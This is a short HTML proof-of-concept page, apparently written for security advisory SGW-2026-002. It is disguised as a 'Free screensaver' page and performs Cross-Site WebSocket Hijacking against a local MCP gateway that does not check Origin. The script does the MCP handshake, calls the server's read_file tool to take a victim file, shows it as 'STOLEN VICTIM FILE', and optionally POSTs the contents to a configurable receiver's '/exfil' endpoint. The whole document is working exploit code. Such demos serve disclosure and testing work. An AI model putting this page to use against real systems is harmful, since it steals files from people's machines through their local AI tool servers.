<!doctype html><meta charset="utf-8"><title>totally-legit-page</title>
<h1>Free screensaver</h1><pre id="out">connecting...</pre>
<script>
// CSWSH demo page for SGW-2026-002. Query parameters:
//   ws   - victim gateway WebSocket URL (default ws://127.0.0.1:18081/ws)
//   file - file the vulnerable local MCP server can read
//   recv - optional proof receiver base URL, e.g. http://127.0.0.1:8899
const q = new URLSearchParams(location.search);
const WS_URL = q.get('ws') || 'ws://127.0.0.1:18081/ws';
const FILE = q.get('file') || '/etc/hostname';
const RECV = q.get('recv');
const ws = new WebSocket(WS_URL);   // no Origin is required by the vulnerable server
const out = document.getElementById('out');
const say = (s) => { out.textContent += '\n' + s; console.log(s); };
ws.onopen = () => {
  say('UPGRADE ACCEPTED from page origin ' + location.origin);
  ws.send(JSON.stringify({jsonrpc:'2.0',id:1,method:'initialize',params:{protocolVersion:'2024-11-05',capabilities:{},clientInfo:{name:'evil-page',version:'1'}}}));
};
ws.onmessage = (ev) => {
  const m = JSON.parse(ev.data);
  if (m.id === 1) {
    ws.send(JSON.stringify({jsonrpc:'2.0',method:'notifications/initialized'}));
    ws.send(JSON.stringify({jsonrpc:'2.0',id:2,method:'tools/call',params:{name:'read_file',arguments:{path:FILE}}}));
  } else if (m.id === 2) {
    const text = m.result.content[0].text.trim();
    say('STOLEN VICTIM FILE: ' + text);
    document.title = 'PWNED ' + text;
    if (RECV) fetch(RECV + '/exfil', {method:'POST', mode:'no-cors', body:'CSWSH ' + WS_URL + ' origin=' + location.origin + ' -> ' + text});
  }
};
ws.onerror = () => say('ws error (server may require auth)');
</script>
